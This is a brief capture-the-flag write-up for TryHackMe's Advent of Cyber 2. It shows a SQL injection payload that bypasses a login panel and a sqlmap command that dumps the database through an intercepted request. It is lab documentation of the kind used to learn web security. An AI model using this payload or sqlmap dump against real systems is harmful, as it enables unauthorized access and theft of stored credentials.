AoC 2 | TryHackMe
================
undermouse, 06.01.2021


# Logging into managing panel
Found `/santapanel` route, which is login-page. Tried simple SQLi and got into panel.  
Used SQLi
```
# Don't forget 'bout space after double dash
' or true; -- 
              ^ space here!
```

It was another search box on the panel page. It was vulnerable too.  
I've intercepted the request with `BurpSuite`, sended it to the **Repeater** tab and then saved as item. Then I've  ran `sqlmap` with this.  
Ran command:
```bash
# req is a file where i saved request from BurpSuite
# I knew that the DBMS is sqlite because it was in Santa's TODO
sqlmap -r req --dump --tamper=space2comment --dbms=sqlite
```

# Flag
Flag and password for admin were in special tables.  
![Results](https://i.imgur.com/GKdcrJD.png "Tables on the database") 
